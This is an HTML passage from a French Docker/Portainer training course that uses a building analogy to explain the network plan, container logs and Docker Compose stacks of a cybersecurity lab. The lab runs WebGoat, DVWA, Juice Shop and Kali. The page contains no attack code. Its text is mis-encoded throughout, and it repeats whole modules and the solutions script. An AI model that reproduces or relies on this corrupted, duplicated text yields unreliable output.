                                <div style="background: rgba(220,53,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîí S√©curit√© r√©seau :</strong> Les conteneurs peuvent se parler en interne mais sont prot√©g√©s de l'ext√©rieur. Seuls les ports explicitement "mapp√©s" sont accessibles depuis votre machine.
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 3.1: Plan de c√¢blage de la r√©sidence</div>
                                
                                <p><strong>üéØ Mission :</strong> V√©rifier le plan de c√¢blage ! Dans Portainer ‚Üí <strong>Networks</strong> ‚Üí <strong>v100_cyberlab_network</strong> :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üåê Subnet : 172.35.0.0/24 (256 adresses possibles)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üö™ Gateway : 172.35.0.1 (sortie vers internet)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üê≥ Portainer IP : 172.35.0.2 (bureau du syndic)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üåê Dashboard IP : 172.35.0.20 (r√©ception)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üéØ Applications : 172.35.0.80-83 (√©tage des formations)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üêß Kali : 172.35.0.100 (atelier au sous-sol)</span>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 15px; margin: 15px 0;">
                                    <p><strong>üí° Info pratique :</strong> Ces adresses internes permettent aux conteneurs de se "parler" entre eux. Par exemple, le Dashboard peut appeler directement WebGoat via son IP interne 172.35.0.82, sans passer par internet !</p>
                                </div>
                                
                                <button class="btn btn-warning" onclick="showPortainerSolution(3)">üí° Solution</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Module 4: Logs -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">4</div>
                        <div class="step-title">Analyse des Logs</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìã Le "carnet de bord" de chaque locataire</div>
                            <div class="docker-concept" style="background: rgba(255,193,7,0.05); padding: 15px; border-radius: 10px; border-left: 4px solid #ffc107; color: #333;">
                                <h4 style="color: #e0a800;">üì∞ Analogie du journal de bord</h4>
                                <p style="color: #555;"><strong>Les logs = Carnet de surveillance de l'immeuble</strong></p>
                                <ul style="margin-left: 20px; color: #555;">
                                    <li>üìù <strong>Nginx (Dashboard)</strong> = Registre des visiteurs : "Qui est venu ? Quand ? Que voulait-il ?"</li>
                                    <li>‚òï <strong>Java (WebGoat)</strong> = Journal de la salle de formation : "D√©marrage, erreurs, exercices lanc√©s"</li>
                                    <li>üêò <strong>PHP (DVWA)</strong> = Carnet du laboratoire : "Tests effectu√©s, vuln√©rabilit√©s test√©es"</li>
                                    <li>üìä <strong>Temps r√©el</strong> = Comme une cam√©ra de surveillance, les logs se mettent √† jour en direct</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîç Technique :</strong> Les logs sont cruciaux pour d√©bugger. Si un service ne fonctionne pas, les logs vous diront pourquoi : erreur de config, manque de ressources, probl√®me r√©seau...
                                </div>
                                
                                <div style="background: rgba(40,167,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üìä Types de logs par application :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Nginx (Dashboard)</strong> = Logs d'acc√®s web : IP, page, code r√©ponse</li>
                                        <li><strong>Java Spring (WebGoat)</strong> = Logs applicatifs : d√©marrage, erreurs, debug</li>
                                        <li><strong>Apache/PHP (DVWA)</strong> = Logs web + PHP : requ√™tes, erreurs de script</li>
                                        <li><strong>Node.js (Juice Shop)</strong> = Logs JavaScript : √©v√©nements, API calls</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(220,53,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üö® Codes √† surveiller dans les logs :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><span style="color: #28a745;">‚úÖ 200, INFO, SUCCESS</span> = Tout va bien</li>
                                        <li><span style="color: #ffc107;">‚ö†Ô∏è 404, WARN, TIMEOUT</span> = Attention requise</li>
                                        <li><span style="color: #dc3545;">‚ùå 500, ERROR, FAILED</span> = Probl√®me critique</li>
                                        <li><span style="color: #6c757d;">üîÑ RESTARTING, RETRY</span> = Service qui red√©marre</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üïµÔ∏è Techniques de lecture des logs :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Filtrage</strong> = Chercher des mots-cl√©s (ERROR, 404, login...)</li>
                                        <li><strong>Chronologie</strong> = Suivre l'ordre des √©v√©nements</li>
                                        <li><strong>Patterns</strong> = Identifier les r√©p√©titions suspectes</li>
                                        <li><strong>Corr√©lation</strong> = Relier les logs de plusieurs services</li>
                                    </ul>
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 4.1: Lecture du carnet de surveillance</div>
                                
                                <p><strong>üéØ Mission :</strong> Jouer au d√©tective ! Analysez les journaux de vos "locataires" :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üì∞ Dashboard logs : format nginx - qui visite la r√©ception ?</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚òï WebGoat logs : d√©marrage Java Spring - la formation est-elle pr√™te ?</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üîÑ G√©n√©rer du trafic : visitez les applications pour cr√©er des logs</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚è±Ô∏è Observer en temps r√©el : nouvelles entr√©es pendant vos actions</span>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 15px 0;">
                                    <p><strong>üéÆ Challenge pratique :</strong> Red√©marrez un conteneur via Portainer et observez les logs de d√©marrage en temps r√©el. C'est comme regarder un locataire d√©m√©nager et s'installer !</p>
                                    <p><strong>üîç Que chercher :</strong></p>
                                    <ul style="margin-left: 20px;">
                                        <li>‚úÖ Messages "Started" ou "Ready" = Tout va bien</li>
                                        <li>‚ùå Messages "ERROR" ou "FAILED" = Probl√®me √† r√©soudre</li>
                                        <li>üîÑ Messages r√©p√©titifs = Boucle infinie, red√©marrage</li>
                                    </ul>
                                </div>
                                
                                <button class="btn btn-warning" onclick="showPortainerSolution(4)">üí° Solution</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Module 5: Stacks -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">5</div>
                        <div class="step-title">Stacks & Docker Compose</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üèóÔ∏è Le "plan de construction" de la r√©sidence</div>
                            <div class="docker-concept" style="background: rgba(108,117,125,0.05); padding: 15px; border-radius: 10px; border-left: 4px solid #6c757d; color: #333;">
                                <h4 style="color: #495057;">üìã Analogie du plan d'architecte</h4>
                                <p style="color: #555;"><strong>Docker Compose = Plan de construction de l'immeuble</strong></p>
                                <ul style="margin-left: 20px; color: #555;">
                                    <li>üèóÔ∏è <strong>Stack "formation-cybersecurite"</strong> = Plan complet de votre r√©sidence</li>
                                    <li>üè† <strong>Services (13)</strong> = Chaque appartement avec ses sp√©cifications</li>
                                    <li>üîå <strong>Networks</strong> = Plan de c√¢blage √©lectrique/internet</li>
                                    <li>üíæ <strong>Volumes</strong> = Caves de stockage (mysql_data, wazuh_data)</li>
                                    <li>‚öôÔ∏è <strong>Variables d'environnement</strong> = Configuration centralis√©e (comme le r√®glement int√©rieur)</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üéØ Avantage :</strong> Avec ce "plan", vous pouvez reconstruire toute la r√©sidence d'un coup ! Un seul fichier d√©crit comment assembler les 13 services, leurs connexions, leurs configurations.
                                </div>
                                
                                <div style="background: rgba(40,167,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîß Commandes magiques du Docker Compose :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose up</code> = Construire tout l'immeuble</li>
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose down</code> = D√©truire l'immeuble (proprement)</li>
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose restart</code> = Red√©marrer tous les appartements</li>
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose logs</code> = Voir tous les carnets de bord</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(255,193,7,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üìã Structure d'un fichier docker-compose.yml :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>version</strong> = Version du format Docker Compose</li>
                                        <li><strong>services</strong> = Liste de tous vos conteneurs</li>
                                        <li><strong>networks</strong> = D√©finition des r√©seaux</li>
                                        <li><strong>volumes</strong> = Espaces de stockage persistants</li>
                                        <li><strong>secrets</strong> = Mots de passe et cl√©s s√©curis√©s</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(220,53,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üéØ Pourquoi utiliser des Stacks/Compose :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Reproducibilit√©</strong> = M√™me r√©sultat partout</li>
                                        <li><strong>Versionning</strong> = Git pour votre infrastructure</li>
                                        <li><strong>Simplicit√©</strong> = 1 commande vs 13 commandes</li>
                                        <li><strong>Maintenance</strong> = Mise √† jour centralis√©e</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîÑ Cycle de vie d'une Stack :</strong>
                                    <ol style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Design</strong> = √âcriture du docker-compose.yml</li>
                                        <li><strong>Deploy</strong> = Lancement via Portainer ou CLI</li>
                                        <li><strong>Monitor</strong> = Surveillance via Portainer</li>
                                        <li><strong>Update</strong> = Modification et red√©ploiement</li>
                                        <li><strong>Scale</strong> = Ajustement des ressources</li>
                                    </ol>
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 5.1: Lecture du plan d'architecte</div>
                                
                                <p><strong>üéØ Mission :</strong> D√©crypter le plan de construction ! Dans Portainer ‚Üí <strong>Stacks</strong> :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üèóÔ∏è Stack : "formation-cybersecurite" (nom du projet)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üè† Services : 13 d√©finis (tous vos "appartements")</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üåê Networks : v100_cyberlab_network (le c√¢blage)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üíæ Volumes : mysql_data, wazuh_data (caves de stockage)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚öôÔ∏è Variables : configuration centralis√©e (r√®glement int√©rieur)</span>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 15px; margin: 15px 0;">
                                    <p><strong>üéì Points cl√©s √† retenir :</strong></p>
                                    <ul style="margin-left: 20px;">
                                        <li>üìã Le fichier <code>docker-compose.yml</code> = Bible de votre infrastructure</li>
                                        <li>üîÑ Tout est reproductible : supprimez tout, relancez ‚Üí identique !</li>
                                        <li>üéõÔ∏è Portainer vous √©vite de taper les commandes en ligne</li>
                                        <li>üìä Vue d'ensemble : relations entre services visibles</li>
                                    </ul>
                                </div>
                                
                                <button class="btn btn-warning" onclick="showPortainerSolution(5)">üí° Solution</button>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- JavaScript pour solutions -->
    <script>
        function showPortainerSolution(moduleNum) {
            const solutions = {
                1: `üéØ SOLUTION MODULE 1 - Premi√®re visite du syndic
                
‚úÖ Interface Portainer d√©couverte:
üìã Dashboard principal:
   ‚Ä¢ ~13 containers actifs (tous vos locataires)
   ‚Ä¢ M√©triques temps r√©el (consommation)
   ‚Ä¢ Statut global de la r√©sidence
   
üß≠ Sections importantes:
   ‚Ä¢ Containers = Liste des appartements
   ‚Ä¢ Images = Catalogue des "types d'appartement"
   ‚Ä¢ Networks = Plan de c√¢blage
   ‚Ä¢ Volumes = Caves de stockage
   ‚Ä¢ Stacks = Plan d'architecte complet

üí° Premi√®re impression: Interface intuitive, tout est visuel !`,

                2: `üéØ SOLUTION MODULE 2 - Inventaire des locataires
                
‚úÖ Services CyberLab identifi√©s:
üåê cyberlab_dashboard: R√©ception (nginx) - point d'entr√©e principal
üéØ cyberlab_webgoat: Salle de formation OWASP - apprentissage interactif
üõ°Ô∏è cyberlab_dvwa: Laboratoire PHP - tests de vuln√©rabilit√©s
üçé cyberlab_juice_shop: Boutique e-commerce - challenges modernes
üê≥ cyberlab_portainer: Bureau du syndic - votre poste de contr√¥le
üêß cyberlab_kali: Atelier de r√©paration - outils de pentesting

üìä Observations types:
   ‚Ä¢ Dashboard: faible CPU, trafic web constant
   ‚Ä¢ WebGoat: CPU moyen, Java gourmand en m√©moire
   ‚Ä¢ Kali: CPU variable selon utilisation outils`,

                3: `üéØ SOLUTION MODULE 3 - Plan de c√¢blage
                
‚úÖ Architecture r√©seau CyberLab:
üèóÔ∏è R√©seau principal: v100_cyberlab_network
üåê Type: bridge custom (r√©seau priv√© isol√©)
üìç Subnet: 172.35.0.0/24 (256 adresses possibles)
üö™ Gateway: 172.35.0.1 (sortie internet)

üè† Plan d'adressage logique:
   ‚Ä¢ 172.35.0.2    ‚Üí Portainer (syndic)
   ‚Ä¢ 172.35.0.20   ‚Üí Dashboard (r√©ception)
   ‚Ä¢ 172.35.0.80-83 ‚Üí Applications (√©tage formations)
   ‚Ä¢ 172.35.0.100  ‚Üí Kali (atelier sous-sol)
   
üí° Avantage: Communication interne rapide + isolation s√©curis√©e`,

                4: `üéØ SOLUTION MODULE 4 - Carnet de surveillance
                
‚úÖ Analyse des logs par service:
üì∞ Dashboard (nginx):
   ‚Ä¢ Format: IP - [timestamp] "GET /page" 200 size
   ‚Ä¢ Indique: visiteurs, pages acc√©d√©es, erreurs 404
   
‚òï WebGoat (Java Spring):
   ‚Ä¢ D√©marrage: "Started WebGoatApplication in X seconds"
   ‚Ä¢ Runtime: logs d'exercices, tentatives d'attaques
   
üîç Techniques de lecture:
   ‚Ä¢ Messages verts = OK, rouges = ERROR
   ‚Ä¢ Timestamps pour chronologie des √©v√©nements
   ‚Ä¢ Patterns r√©p√©titifs = probl√®mes r√©currents
   
üéÆ Test pratique: Restart ‚Üí observer s√©quence d√©marrage compl√®te`,

                5: `üéØ SOLUTION MODULE 5 - Plan d'architecte
                
‚úÖ Stack Docker Compose analys√©e:
üìã Fichier: docker-compose.yml (Bible de l'infrastructure)
üèóÔ∏è Stack name: "formation-cybersecurite" (nom du projet)

üè† Architecture d√©finie:
   ‚Ä¢ 13 services orchestr√©s automatiquement
   ‚Ä¢ D√©pendances entre services g√©r√©es
   ‚Ä¢ R√©seau bridge custom partag√©
   ‚Ä¢ Volumes persistants (mysql_data, wazuh_data)
   ‚Ä¢ Variables d'environnement centralis√©es
   
üéØ Puissance de Docker Compose:
   ‚Ä¢ 1 commande = d√©ploiement complet
   ‚Ä¢ Infrastructure as Code
   ‚Ä¢ Reproductibilit√© garantie
   ‚Ä¢ Gestion des versions simplifi√©e
   
üí° Portainer = GUI pour √©viter la ligne de commande !`
            };
            
            alert(solutions[moduleNum] || "Solution non disponible");
        }
    </script>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìã Le "carnet de bord" de chaque locataire</div>
                            <div class="docker-concept" style="background: rgba(255,193,7,0.05); padding: 15px; border-radius: 10px; border-left: 4px solid #ffc107; color: #333;">
                                <h4 style="color: #e0a800;">üì∞ Analogie du journal de bord</h4>
                                <p style="color: #555;"><strong>Les logs = Carnet de surveillance de l'immeuble</strong></p>
                                <ul style="margin-left: 20px; color: #555;">
                                    <li>üìù <strong>Nginx (Dashboard)</strong> = Registre des visiteurs : "Qui est venu ? Quand ? Que voulait-il ?"</li>
                                    <li>‚òï <strong>Java (WebGoat)</strong> = Journal de la salle de formation : "D√©marrage, erreurs, exercices lanc√©s"</li>
                                    <li>üêò <strong>PHP (DVWA)</strong> = Carnet du laboratoire : "Tests effectu√©s, vuln√©rabilit√©s test√©es"</li>
                                    <li>üìä <strong>Temps r√©el</strong> = Comme une cam√©ra de surveillance, les logs se mettent √† jour en direct</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîç Technique :</strong> Les logs sont cruciaux pour d√©bugger. Si un service ne fonctionne pas, les logs vous diront pourquoi : erreur de config, manque de ressources, probl√®me r√©seau...
                                </div>
                                
                                <div style="background: rgba(40,167,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üìä Types de logs par application :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Nginx (Dashboard)</strong> = Logs d'acc√®s web : IP, page, code r√©ponse</li>
                                        <li><strong>Java Spring (WebGoat)</strong> = Logs applicatifs : d√©marrage, erreurs, debug</li>
                                        <li><strong>Apache/PHP (DVWA)</strong> = Logs web + PHP : requ√™tes, erreurs de script</li>
                                        <li><strong>Node.js (Juice Shop)</strong> = Logs JavaScript : √©v√©nements, API calls</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(220,53,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üö® Codes √† surveiller dans les logs :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><span style="color: #28a745;">‚úÖ 200, INFO, SUCCESS</span> = Tout va bien</li>
                                        <li><span style="color: #ffc107;">‚ö†Ô∏è 404, WARN, TIMEOUT</span> = Attention requise</li>
                                        <li><span style="color: #dc3545;">‚ùå 500, ERROR, FAILED</span> = Probl√®me critique</li>
                                        <li><span style="color: #6c757d;">üîÑ RESTARTING, RETRY</span> = Service qui red√©marre</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üïµÔ∏è Techniques de lecture des logs :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Filtrage</strong> = Chercher des mots-cl√©s (ERROR, 404, login...)</li>
                                        <li><strong>Chronologie</strong> = Suivre l'ordre des √©v√©nements</li>
                                        <li><strong>Patterns</strong> = Identifier les r√©p√©titions suspectes</li>
                                        <li><strong>Corr√©lation</strong> = Relier les logs de plusieurs services</li>
                                    </ul>
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 4.1: Lecture du carnet de surveillance</div>
                                
                                <p><strong>üéØ Mission :</strong> Jouer au d√©tective ! Analysez les journaux de vos "locataires" :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üì∞ Dashboard logs : format nginx - qui visite la r√©ception ?</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚òï WebGoat logs : d√©marrage Java Spring - la formation est-elle pr√™te ?</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üîÑ G√©n√©rer du trafic : visitez les applications pour cr√©er des logs</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚è±Ô∏è Observer en temps r√©el : nouvelles entr√©es pendant vos actions</span>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 15px 0;">
                                    <p><strong>üéÆ Challenge pratique :</strong> Red√©marrez un conteneur via Portainer et observez les logs de d√©marrage en temps r√©el. C'est comme regarder un locataire d√©m√©nager et s'installer !</p>
                                    <p><strong>üîç Que chercher :</strong></p>
                                    <ul style="margin-left: 20px;">
                                        <li>‚úÖ Messages "Started" ou "Ready" = Tout va bien</li>
                                        <li>‚ùå Messages "ERROR" ou "FAILED" = Probl√®me √† r√©soudre</li>
                                        <li>üîÑ Messages r√©p√©titifs = Boucle infinie, red√©marrage</li>
                                    </ul>
                                </div>
                                
                                <button class="btn btn-warning" onclick="showPortainerSolution(4)">üí° Solution</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Module 5: Stacks -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">5</div>
                        <div class="step-title">Stacks & Docker Compose</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üèóÔ∏è Le "plan de construction" de la r√©sidence</div>
                            <div class="docker-concept" style="background: rgba(108,117,125,0.05); padding: 15px; border-radius: 10px; border-left: 4px solid #6c757d; color: #333;">
                                <h4 style="color: #495057;">üìã Analogie du plan d'architecte</h4>
                                <p style="color: #555;"><strong>Docker Compose = Plan de construction de l'immeuble</strong></p>
                                <ul style="margin-left: 20px; color: #555;">
                                    <li>üèóÔ∏è <strong>Stack "formation-cybersecurite"</strong> = Plan complet de votre r√©sidence</li>
                                    <li>üè† <strong>Services (13)</strong> = Chaque appartement avec ses sp√©cifications</li>
                                    <li>üîå <strong>Networks</strong> = Plan de c√¢blage √©lectrique/internet</li>
                                    <li>üíæ <strong>Volumes</strong> = Caves de stockage (mysql_data, wazuh_data)</li>
                                    <li>‚öôÔ∏è <strong>Variables d'environnement</strong> = Configuration centralis√©e (comme le r√®glement int√©rieur)</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üéØ Avantage :</strong> Avec ce "plan", vous pouvez reconstruire toute la r√©sidence d'un coup ! Un seul fichier d√©crit comment assembler les 13 services, leurs connexions, leurs configurations.
                                </div>
                                
                                <div style="background: rgba(40,167,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîß Commandes magiques du Docker Compose :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose up</code> = Construire tout l'immeuble</li>
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose down</code> = D√©truire l'immeuble (proprement)</li>
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose restart</code> = Red√©marrer tous les appartements</li>
                                        <li><code style="background: #e9ecef; padding: 2px 6px; border-radius: 3px;">docker-compose logs</code> = Voir tous les carnets de bord</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(255,193,7,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üìã Structure d'un fichier docker-compose.yml :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>version</strong> = Version du format Docker Compose</li>
                                        <li><strong>services</strong> = Liste de tous vos conteneurs</li>
                                        <li><strong>networks</strong> = D√©finition des r√©seaux</li>
                                        <li><strong>volumes</strong> = Espaces de stockage persistants</li>
                                        <li><strong>secrets</strong> = Mots de passe et cl√©s s√©curis√©s</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(220,53,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üéØ Pourquoi utiliser des Stacks/Compose :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Reproducibilit√©</strong> = M√™me r√©sultat partout</li>
                                        <li><strong>Versionning</strong> = Git pour votre infrastructure</li>
                                        <li><strong>Simplicit√©</strong> = 1 commande vs 13 commandes</li>
                                        <li><strong>Maintenance</strong> = Mise √† jour centralis√©e</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîÑ Cycle de vie d'une Stack :</strong>
                                    <ol style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Design</strong> = √âcriture du docker-compose.yml</li>
                                        <li><strong>Deploy</strong> = Lancement via Portainer ou CLI</li>
                                        <li><strong>Monitor</strong> = Surveillance via Portainer</li>
                                        <li><strong>Update</strong> = Modification et red√©ploiement</li>
                                        <li><strong>Scale</strong> = Ajustement des ressources</li>
                                    </ol>
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 5.1: Lecture du plan d'architecte</div>
                                
                                <p><strong>üéØ Mission :</strong> D√©crypter le plan de construction ! Dans Portainer ‚Üí <strong>Stacks</strong> :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üèóÔ∏è Stack : "formation-cybersecurite" (nom du projet)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üè† Services : 13 d√©finis (tous vos "appartements")</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üåê Networks : v100_cyberlab_network (le c√¢blage)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üíæ Volumes : mysql_data, wazuh_data (caves de stockage)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚öôÔ∏è Variables : configuration centralis√©e (r√®glement int√©rieur)</span>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 15px; margin: 15px 0;">
                                    <p><strong>üéì Points cl√©s √† retenir :</strong></p>
                                    <ul style="margin-left: 20px;">
                                        <li>üìã Le fichier <code>docker-compose.yml</code> = Bible de votre infrastructure</li>
                                        <li>üîÑ Tout est reproductible : supprimez tout, relancez ‚Üí identique !</li>
                                        <li>üéõÔ∏è Portainer vous √©vite de taper les commandes en ligne</li>
                                        <li>üìä Vue d'ensemble : relations entre services visibles</li>
                                    </ul>
                                </div>
                                
                                <button class="btn btn-warning" onclick="showPortainerSolution(5)">üí° Solution</button>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- JavaScript pour solutions -->
    <script>
        function showPortainerSolution(moduleNum) {
            const solutions = {
                1: `üéØ SOLUTION MODULE 1 - Premi√®re visite du syndic
                
‚úÖ Interface Portainer d√©couverte:
üìã Dashboard principal:
   ‚Ä¢ ~13 containers actifs (tous vos locataires)
   ‚Ä¢ M√©triques temps r√©el (consommation)
   ‚Ä¢ Statut global de la r√©sidence
   
üß≠ Sections importantes:
   ‚Ä¢ Containers = Liste des appartements
   ‚Ä¢ Images = Catalogue des "types d'appartement"
   ‚Ä¢ Networks = Plan de c√¢blage
   ‚Ä¢ Volumes = Caves de stockage
   ‚Ä¢ Stacks = Plan d'architecte complet

üí° Premi√®re impression: Interface intuitive, tout est visuel !`,

                2: `üéØ SOLUTION MODULE 2 - Inventaire des locataires
                
‚úÖ Services CyberLab identifi√©s:
üåê cyberlab_dashboard: R√©ception (nginx) - point d'entr√©e principal
üéØ cyberlab_webgoat: Salle de formation OWASP - apprentissage interactif
üõ°Ô∏è cyberlab_dvwa: Laboratoire PHP - tests de vuln√©rabilit√©s
üçé cyberlab_juice_shop: Boutique e-commerce - challenges modernes
